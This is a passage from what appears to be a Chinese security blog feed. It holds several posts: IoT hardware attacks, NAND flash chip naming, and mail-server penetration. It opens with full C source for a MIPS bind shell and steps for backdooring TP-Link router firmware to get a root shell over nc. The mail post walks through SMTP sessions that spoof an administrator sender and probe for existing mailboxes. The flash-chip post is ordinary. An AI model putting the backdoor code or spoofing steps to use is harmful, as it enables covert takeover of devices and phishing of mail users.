class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SERVER_PORT9999</span><br> <span class="hljs-comment">/* CC-BY: Osanda Malith Jayathissa (@OsandaMalith)</span><br><span class="hljs-comment">  * Bind Shell using Fork for my TP-Link mr3020 router running busybox</span><br><span class="hljs-comment">  * Arch : MIPS</span><br><span class="hljs-comment">  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc</span><br><span class="hljs-comment">  */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> serverfd, clientfd, server_pid, i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *banner = <span class="hljs-string">&quot;[~] Welcome to @OsandaMalith&#x27;s Bind Shell\n&quot;</span>;<br><span class="hljs-keyword">char</span> *args[] = &#123; <span class="hljs-string">&quot;/bin/busybox&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span> &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>, <span class="hljs-title">client</span>;</span><br><span class="hljs-keyword">socklen_t</span> len;<br><br>server.sin_family = AF_INET;<br>server.sin_port = htons(SERVER_PORT);<br>server.sin_addr.s_addr = INADDR_ANY; <br><br>serverfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>bind(serverfd, (struct sockaddr *)&amp;server, <span class="hljs-keyword">sizeof</span>(server));<br>listen(serverfd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123; <br>    len = <span class="hljs-keyword">sizeof</span>(struct sockaddr);<br>    clientfd = accept(serverfd, (struct sockaddr *)&amp;client, &amp;len);<br>        server_pid = fork(); <br>        <span class="hljs-keyword">if</span> (server_pid) &#123; <br>        write(clientfd, banner,  <span class="hljs-built_in">strlen</span>(banner));<br>        <span class="hljs-keyword">for</span>(; i &lt;<span class="hljs-number">3</span> <span class="hljs-comment">/*u*/</span>; i++) dup2(clientfd, i);<br>        execve(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, args, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span>);<br>        close(clientfd); <br>    &#125; close(clientfd);<br>    &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>将编译好的二进制文件放到文件系统中，修改/etc/scripts下的system.sh</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/etc/binshell        <span class="hljs-comment">//bindshell为编译后的后门二进制文件</span><br></code></pre></td></tr></table></figure></li><li><p>重新打包</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">build-firmware.sh </span>文件名 -<span class="hljs-keyword">nopad </span>-min<br></code></pre></td></tr></table></figure></li><li><p>Firmware-name/文件下生成新的固件</p></li><li><p>安装固件，使用nc连接，获得root权限shell</p></li></ol><h1 id="3-设备攻击"><a href="#3-设备攻击" class="headerlink" title="3. 设备攻击"></a>3. 设备攻击</h1><p>硬件攻击主要涉及以下步骤：</p><ul><li>信息收集与分析</li><li>设备的外部分析与内部分析</li><li>通信接口识别</li><li>硬件通讯技术获取数据</li><li>基于硬件漏洞利用方法的软件漏洞利用</li><li>后门植入</li></ul><h2 id="3-1-信息收集与分析"><a href="#3-1-信息收集与分析" class="headerlink" title="3.1 信息收集与分析"></a>3.1 信息收集与分析</h2><p>对于某一特定设备而言，可以通过一系列方法获取相关目标设别的信息，此时的信息来源既包括公开查询的信息，也可以是从客户手里或者其他渠道获取的文档。</p><p>涉及的信息主要包括：</p><ul><li>嵌入式设备基于哪种架构？</li><li>该设备运行在何种操作系统上？</li><li>该设备支持哪些外设？</li><li>该设备采用了哪些芯片组？</li><li>设备采用的存储与内存的实现方面的细节。</li><li>关于设备的其他相关技术信息。</li></ul><h2 id="3-2-外部分析与内部分析"><a href="#3-2-外部分析与内部分析" class="headerlink" title="3.2 外部分析与内部分析"></a>3.2 外部分析与内部分析</h2><p>获取设备信息后，下一步针对设备自身开展分析工作，这一步的目的在于从攻击者的视角来观察设备，并从外部和内部观察，尽可能获取更多的信息。</p><p>外部分析只需要查看设备的外观，搞清楚每个组件的作用。</p><ul><li><p>设备有哪些接口，是否提供USB接口、SD卡槽或以太网口？</p></li><li><p>设备如何供电，电池、POE还是电源适配器？</p></li><li><p>设备设否有标签？有标签的话，包含了哪些信息？</p><p> 完成外部分析后，下一步就是对设备进行内部分析，需要打开外壳观察PCB板，这一步骤我们需要识别出设备所采用的各种芯片组，继而在芯片数据手册中查找对应的芯片组，了解每个组件的功能，同时将芯片数据手册中找到的各种信息做好记录。</p></li></ul><h2 id="3-3-通信接口识别"><a href="#3-3-通信接口识别" class="headerlink" title="3.3 通信接口识别"></a>3.3 通信接口识别</h2><p>​    有一些设备接口显而易见，可以轻松识别，但是另外一些情况下，通信接口可能会分布PCB的不同位置，所以识别起来可能会困难一下，还有些情况下需要自行连接到芯片的引脚排针才能识别的接口类型。</p><h2 id="3-4-硬件通信技术获取数据"><a href="#3-4-硬件通信技术获取数据" class="headerlink" title="3.4 硬件通信技术获取数据"></a>3.4 硬件通信技术获取数据</h2><p>识别出硬件采用的通信协议后与接口后，就可以借助专门工具通过特定协议与目标设备进行通信，并且与目标设备进行交互或读写芯片信息。</p><p>测试过程中常用到的接口包括UART、JTAG、SPI、I2C、SWD、RDI以及1-Wire</p><h2 id="3-5-硬件分析"><a href="#3-5-硬件分析" class="headerlink" title="3.5 硬件分析"></a>3.5 硬件分析</h2><p>查看PCB并识别出板上的所有芯片，查看芯片标签时，可以将芯片稍微倾斜，使用USB电子显微镜或者手机闪光灯查看标签设备。</p><p>如果识别出了芯片，可以在Google输入该芯片的制造厂商，再加上芯片型号以及datasheet（芯片数据手册），尝试搜索芯片的数据手册。</p><p>获得芯片数据手册后，可以使用手册中的信息识别出目标芯片的所有特征，包括引脚定义。</p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>存储芯片</title>
    <link href="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/"/>
    <url>/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p> CE：片选，大致来说，一个DIE(<strong>die:晶圆上的一个小块，就是一个晶片晶圆体，学名叫做die，封装后就成为一个颗粒</strong>)有一个CE，多CE的 单片闪存，就是多管芯的闪存，相当于一片闪存那么大的地方，装下了不止一片闪存，特别是BGA的板子，能实现单片双通道，就是这个原理。</p><p>通道数：通道数取决于主控IC的设计，一般现在的3.0板子都是双通道板子(还有坑爹的916单通道),也就是说支持双通道需要：主控的支持加上电路板的设计。理论上通道数翻倍，速度翻倍，TSOP的板子，一般来说，一面就是一个通道，多管芯的 TSOP 闪存，一般也只能单通道。尽量双贴。</p><p> DDR 、Toggle：它俩可以用约等于，”同步“，同步闪存 速度比 异步闪存快了很多，尽量选用支持 同步模式的 闪存，一般来说，DDR 需要在量产的时候勾选，但是Toggle 是 默认开启的，不需要特殊操作。<br>interleave ： 交错操作，简单的把U盘的存储过程分解，可以解释为：</p><pre><code>第一步：数据发到存储总线、存储总线 到 NAND Flash；第二步就是反过来，interleave模式 就是 一个CE在 执行 第一步的时候，另一个CE 可以同时的 执行第二步，interleave 的等级，取决于 一个通道上的闪存的 CE数。</code></pre><h2 id="东芝闪存-日本"><a href="#东芝闪存-日本" class="headerlink" title="东芝闪存(日本)"></a>东芝闪存(日本)</h2><p>东芝（Toshiba），是日本最大的半导体制造商，也是第二大综合电机制造商，隶属于三井集团。公司创立于1875年7月，原名东京芝浦电气株式会社，1939年由东京电气株式会社和芝浦制作所合并而成。</p><h3 id="闪存命名规则"><a href="#闪存命名规则" class="headerlink" title="闪存命名规则"></a>闪存命名规则</h3> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E4%B8%9C%E8%8A%9D%E9%97%AA%E5%AD%98%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99.png" class=""> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E4%B8%9C%E8%8A%9D%E9%97%AA%E5%AD%98%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%991.png" class=""><h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p>对于东芝闪存来说，所有闪存部件都以字母T开头，分为TC58和TH58两种，前者代表单芯片封装（颗粒内只有一个闪存die），后者代表多芯片封装（颗粒内有多于1个die）。</p><p>五位“T”代表闪存接口类型为Toggle：一种由东芝和三星领导的闪存接口标准，区别于美光和海力士提出的ONFI标准。</p><p>第六位的“F”代表闪存工作的Vcc电压为2.35V<del>3.6V、VccQ电压为2.7V</del>3.6V或1.7V~1.95V。</p><p>第七和第八位需要连同在一起来看，代表闪存颗粒的容量，T0对应的是1T比特，也就是128GB。</p><p>第九位的“T“代表8 Level（3bit/cell），即TLC类型。</p><p>第十位的2代表Page页大小为16KB。</p><p>第11和第12位连在一起表达封装形式，TA表示使用无铅、无卤素环保工艺的TSOP封装。右数倒数第二位的“2”代表单闪存通道、2个CE引脚。</p><h2 id="旺宏MXIC-中国台湾"><a href="#旺宏MXIC-中国台湾" class="headerlink" title="旺宏MXIC(中国台湾)"></a>旺宏MXIC(中国台湾)</h2><p>MXIC 36nm NAND Flash，1GB闪存</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%97%BA%E5%AE%8FFlash1.png" class=""><h2 id="Foresee江波龙-中国深圳"><a href="#Foresee江波龙-中国深圳" class="headerlink" title="Foresee江波龙(中国深圳)"></a>Foresee江波龙(中国深圳)</h2><p>FORESEE 江波龙 FS33ND01GS108TFI0 1Gib NAND 闪存颗粒</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%B1%9F%E6%B3%A2%E9%BE%99Flash1.png" class=""><h2 id="ESMT晶豪科技-中国台湾"><a href="#ESMT晶豪科技-中国台湾" class="headerlink" title="ESMT晶豪科技(中国台湾)"></a>ESMT晶豪科技(中国台湾)</h2><p>晶豪ESMT M15T1G1664A，DDR3 1Gb 内存</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%99%B6%E8%B1%AA%E7%A7%91%E6%8A%80Flash1.png" class="">]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>flash</tag>
      
      <tag>闪存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>邮件服务渗透</title>
    <link href="/2021/08/22/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
    <url>/2021/08/22/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="POP3、SMTP和IMAP"><a href="#POP3、SMTP和IMAP" class="headerlink" title="POP3、SMTP和IMAP"></a>POP3、SMTP和IMAP</h2><p>SMTP</p><p>SMTP 的全称是“Simple Mail Transfer Protocol”，即简单邮件传输协议（25号端口）。它是一组用于从源地址到目的地址传输邮件的规范，通过它来控制邮件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。SMTP是一个“推”的协议，它不允许根据需要从远程服务器上“拉”来消息。SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器。<br>SMTP 认证，简单地说就是要求必须在提供了账户名和密码之后才可以登录 SMTP 服务器，这就使得那些垃圾邮件的散播者无可乘之机。<br>增加 SMTP 认证的目的是为了使用户避免受到垃圾邮件的侵扰。</p><p>IMAP</p><p>IMAP全称是Internet Mail Access Protocol，即交互式邮件存取协议，是一个应用层协议（端口是143）。用来从本地邮件客户端（Outlook Express、Foxmail、Mozilla Thunderbird等）访问远程服务器上的邮件。它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。所以无论从浏览器登录邮箱或者客户端软件登录邮箱，看到的邮件以及状态都是一致的。</p><p>POP3</p><p>POP3是Post Office Protocol 3的简称，即邮局协议的第3个版本,是TCP/IP协议族中的一员（默认端口是110）。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。,它规定怎样将个人计算机连接到Internet的邮件服务器和下载电子邮件的电子协议。它是因特网电子邮件的第一个离线协议标准,POP3允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。</p><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><ul><li>IMAP  SSL协议端口号：993           非SSL端口号：143</li><li>SMTP  SSL协议端口号：465/994   非SSL端口号：25</li><li>POP3   SSL协议端口号：995          非SSL端口号：110</li></ul><h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SMTP 就是 Simple Mail Transfer Protocol 的缩写翻译来就是邮件传输协议，也就是用来发邮件的。IMAP 是 Internet Mail Access Protocol 的缩写，也就是用来收邮件的（和它类似的还有个 POP3，也是用来收邮件的）。</p><h3 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h3><p>SMTP通常有两种工作模式。发送SMTP和接收SMTP。具体工作方式为：发送SMTP在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向DNS查询远端邮件服务器的MX记录，并建立与远端接收SMTP之间的一个双向传送通道，此后SMTP命令由发送SMTP发出，由接收SMTP接收，而应答则反方向传送。一旦传送通道建立，SMTP发送者发送MAIL命令指明邮件发送者。如果SMTP接收者可以接收邮件则返回OK应答。SMTP发送者再发出RCPT命令确认邮件是否接收到。如果SMTP接收者接收，则返回OK应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回OK应答。</p><h3 id="SMTP的连接和发送过程"><a href="#SMTP的连接和发送过程" class="headerlink" title="SMTP的连接和发送过程"></a>SMTP的连接和发送过程</h3><ol><li><p>建立TCP连接</p></li><li><p>客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；</p><pre><code>   服务器端以OK作为响应，表明准备接收</code></pre></li><li><p>客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；</p><pre><code>    服务器端则表示是否愿意为收件人接收邮件</code></pre></li><li><p>协商结束，发送邮件，用命令DATA发送</p></li><li><p>以.表示结束输入内容一起发送出去</p></li><li><p>结束此次发送，用QUIT命令退出</p></li></ol><h3 id="邮件头"><a href="#邮件头" class="headerlink" title="邮件头"></a>邮件头</h3><p>以下是常见的标题头字段说明。</p><ul><li><p>return-path：邮件的回复地址。</p></li><li><p>from：发件人地址。</p></li><li><p>to：收件人地址。</p></li><li><p>subject：邮件主题，即邮件名。</p></li><li><p>body：邮件内容。</p></li><li><p>date：邮件发送日期。</p></li><li><p>cc：抄送。</p></li><li><p>bcc：密送。</p><p>………..</p></li></ul><h3 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h3><h4 id="简单的发送"><a href="#简单的发送" class="headerlink" title="简单的发送"></a>简单的发送</h4><ol><li><strong>建立TCP连接</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">$ telnet xxxx.com 25 #widnows下测试<br># 或者<br>$ nc xxxxx.com 25   #Linux下测试<br></code></pre></td></tr></table></figure><p>服务器返回220状态码，就表示连接成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">220 MAIL-SERVER Winmail Mail Server ESMTP ready<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>HELO 命令和 EHLO 命令</strong></li></ol><p>SMTP 协议规定，连接成功后，必须向邮件服务器提供连接的域名，也就是邮件将从哪台服务器发来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">HELO xxxx.com<br></code></pre></td></tr></table></figure><p>邮件服务器返回状态码250，表示响应成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">250 MAIL-SERVER Winmail Mail Server<br></code></pre></td></tr></table></figure><p><code>HELO</code>命令现在比较少用，一般都使用<code>EHLO</code>命令。<br>邮件服务器收到<code>EHLO</code>命令以后，不仅会返回<code>250</code>状态码，还会返回自己支持的<code>各种扩展的列表</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ru">250-MAIL-SERVER Winmail Mail Server<br>250-AUTH LOGIN PLAIN<br>250-SIZE 20971520<br>250 8BITMIME<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>MAIL FROM 命令</strong></li></ol><p>连接者要使用MAIL FROM命令，向邮件服务器提供邮件的来源邮箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">MAIL FROM:admin@xxxx.com  #伪造管理员身份来发邮件<br></code></pre></td></tr></table></figure><p>上面代码表示，连接者将从<code>admin@xxxxx.com</code>向邮件服务器发送邮件。邮件服务器返回<code>250</code>状态码，表示响应成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">250 ok<br></code></pre></td></tr></table></figure><ol start="4"><li><strong>RCPT TO 命令</strong></li></ol><p>使用RCPT TO命令，验证邮件地址是否存在。如果查询的是一个真实的 Email 地址，邮件服务器就会返回<code>250</code>状态码。验证邮箱存在的话，还可以给这个接受者邮箱发送邮件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ru">RCPT TO:admin@xxxxx.com<br>250 ok<br></code></pre></td></tr></table></figure><p>一般来说，状态码 250 和 251 都表示邮箱存在，状态码 5xx 表示不存在，其他状态码（主要是 4xx）则代表无法确认。</p><ol start="5"><li><strong>DATA 伪造邮箱数据</strong></li></ol><p>使用DATA命令来伪造邮箱内容,客户端告诉服务器自己准备发送邮件正文<br>服务器返回354，表示自己已经作好接受邮件的准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ru">DATA<br>354 go ahead, end data with CRLF.CRLF<br></code></pre></td></tr></table></figure><p>输入邮件伪造正文</p><p>用<code>英文状态的双引号</code>来修饰正文，正文结束后，发送结束符<code>.</code>表明正文的结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">&quot;这是一个邮件伪造测试&quot;<br>.<br>250 ok message accepted for delivery<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>退出TCP连接</strong></li></ol><p>邮件发送结束，客户端请求断开连接后，使用<code>QUIT</code>命令关闭 TCP 连接。<br>服务器返回<code>211</code>，提示断开申请被采纳，并主动断开连接，整个邮件发送过程结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">QUIT<br>221 MAIL-SERVER Winmail Mail Server<br>Connection closed by foreign host.<br></code></pre></td></tr></table></figure><h4 id="不带附件"><a href="#不带附件" class="headerlink" title="不带附件"></a>不带附件</h4><p>1：黑色字体是cmd里输入的。’//’后面是返回的数据。<br>2：cmd里面不能手动输汉字什么的，只能复制粘贴靠谱点。<br>3：空行和邮件QUIT结束前的那个’.’号都是必须输入的。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> ip/域名 <span class="hljs-number">25</span>      *//<span class="hljs-number">1</span>、EHLO，期待返回<span class="hljs-number">220</span>或者<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//220 163.com Anti-spam GT for Coremail System (163com[20141201])</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ehlo <span class="hljs-number">163</span>.dcom *<span class="hljs-regexp">//</span>向邮件服务器提供连接的域名，也就是邮件将从哪台服务器发来， 除了HELO所具     有的功能外，EHLO主要用来查询服务器支持的扩充功能*<br></code></pre></td></tr></table></figure><p><em>//250 OK</em>    </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">auth</span> login   *//<span class="hljs-number">2</span>、发送Auth Login，期待返回<span class="hljs-number">334</span>*<br></code></pre></td></tr></table></figure><p><em>//334 dXNlcm5hbWU6      /*Base64:”username:”*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MTIzNDU2QDE2My5jb20</span>=    *//<span class="hljs-number">3</span>、Base<span class="hljs-number">64</span>:<span class="hljs-string">&quot;123456@163.com 发送经过Base64编码的用户名，期待返回334*</span><br></code></pre></td></tr></table></figure><p><em>//334 UGFzc3dvcmQ6      /*Base64:”Password:”*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MTIzNDU2</span>                *//<span class="hljs-number">4</span>、Base<span class="hljs-number">64</span>:<span class="hljs-string">&quot;123456&quot;</span> 发送经过Base<span class="hljs-number">64</span>编码的密码，期待返回<span class="hljs-number">235</span>*<br></code></pre></td></tr></table></figure><p><em>//235 Authentication successful</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mail</span> from:&lt;<span class="hljs-number">123456</span>@<span class="hljs-number">163</span>.com&gt;        *//<span class="hljs-number">5</span>、发件人邮箱 发送Mail From，期待返回<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//250 Mail OK</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rcpt</span> to:&lt;<span class="hljs-number">123456</span>@qq.com&gt;              *//<span class="hljs-number">6</span>、收件人邮箱 发送Rcpt To。期待返回<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//250 Mail OK</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>                                                *//<span class="hljs-number">7</span>、发送DATA，期待返回<span class="hljs-number">354</span>*<br></code></pre></td></tr></table></figure><p><em>//354 End data with . /*这里提示你了,结束是使用‘回车换行.回车换行’*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Date</span>: <span class="hljs-number">12</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">17</span>:<span class="hljs-number">22</span>:<span class="hljs-number">29</span>       *//时间<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">From</span>:<span class="hljs-string">&quot;测试CMD&quot;</span>&lt;<span class="hljs-number">123456</span>@<span class="hljs-number">163</span>.com&gt;      *//<span class="hljs-number">8</span>.<span class="hljs-number">0</span>、发件人显示名,邮箱发送From*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">To</span>:&lt;<span class="hljs-number">123456</span>@qq.com&gt;                    *//<span class="hljs-number">8</span>.<span class="hljs-number">1</span>、收件人邮箱 发送To*<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Reply-To: <span class="hljs-symbol">123456@</span><span class="hljs-number">163.</span>com        *<span class="hljs-comment">//回复地址 还是填发件人邮箱\*/*</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Mailer: The Bat! (v<span class="hljs-number">3</span>.<span class="hljs-number">02</span>) Professional.      *//代理发信的客户端,这两行X-的不写也行\*/*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Priority: <span class="hljs-number">3</span> (Normal)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Subject</span>:CMD命令发送的邮件                   *//<span class="hljs-number">8</span>.<span class="hljs-number">2</span>、信件的主题 发送标题*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MIME</span>-Version: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                                   *//<span class="hljs-number">8</span>.<span class="hljs-number">3</span>、发送其他Header内容*<br></code></pre></td></tr></table></figure><p><em>/*普通不带附件的写法*/</em></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">type</span>: <span class="hljs-type">text</span>/plain; charset=&quot;gb2312&quot;  *// 想发送HTML格式的文本用<span class="hljs-type">text</span>/html <br><br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: <span class="hljs-number">7</span>bit<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">空格 *<span class="hljs-regexp">//</span><span class="hljs-number">8.4</span>、发送一个空行，结束Header发送* <br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">这是一个CMD命令发送的邮件！！！      *<span class="hljs-regexp">//</span><span class="hljs-number">8.5</span>、发送信件主体*<br>--TESTMAIL--<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.      <span class="hljs-regexp">//</span>.代表结束<br></code></pre></td></tr></table></figure><p>//250 Mail OK queued as smtp14,EsCowED5tEVmcxhXlcgQAA–.7461S3 1461220657</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">QUIT</span>                                                //<span class="hljs-number">10</span>、发送Quit，退出，期待返回<span class="hljs-number">221</span><br></code></pre></td></tr></table></figure><p>/* 邮件发送结束了 */</p><h4 id="带附件"><a href="#带附件" class="headerlink" title="带附件"></a>带附件</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">/*带附件的比不带附加的多三行命令，后两行是一样的，前三行是加的*/</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/mixed;boundary=&quot;TESTMAIL&quot;<br><br><span class="hljs-comment">--TESTMAIL</span><br>Content-<span class="hljs-keyword">type</span>: <span class="hljs-type">text</span>/plain; charset=&quot;gb2312&quot;<br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: <span class="hljs-number">7</span>bit<br><br><span class="hljs-comment">/*然后发送附件的话每个附加发送的头都要加下面的命令*/</span><br><span class="hljs-comment">--TESTMAIL</span><br>Content-<span class="hljs-keyword">Type</span>: application/x-msdownload; <span class="hljs-type">name</span>=&quot;D:\1.html&quot;<br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: 